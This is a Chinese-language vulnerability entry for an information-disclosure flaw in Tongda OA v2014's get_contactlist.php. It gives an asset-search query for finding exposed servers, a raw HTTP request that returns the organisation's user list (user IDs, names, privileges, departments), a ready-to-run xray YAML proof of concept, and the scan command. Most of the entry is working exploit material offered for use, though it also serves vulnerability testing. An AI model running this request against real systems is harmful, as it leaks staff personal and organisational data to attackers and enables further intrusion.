# 通达OA v2014 get_contactlist.php 敏感信息泄漏漏洞
## 漏洞描述

通达OA v2014 get_contactlist.php文件存在信息泄漏漏洞，攻击者通过漏洞可以获取敏感信息，进一步攻击。
## 影响版本
```
通达OA v2014
```

## 网络测绘
```
app="TDXK-通达OA"
```

## 环境搭建

-

## 漏洞复现
![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309201938916.png)


## 数据包
```
GET /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0


```

## YAML代码
```
name: poc-yaml-tongda-v2014-get-contactlist-disclosure
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3
    expression: response.status == 200 && response.body.bcontains(b'"user_uid":') && response.body.bcontains(b'"user_name":') && response.body.bcontains(b'"priv_name":') && response.body.bcontains(b'"dept_name":')
expression: r0()
detail:
  author: klear
  links:
    - https://vuls.info/PeiQi/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2014%20get_contactlist.php%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/?h=contactlist#_4

```

## xray调用

```
xraypro ws --poc poc-yaml-tongda-v2014-get-contactlist-disclosure.yml --url xxx

```

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309201940134.png)
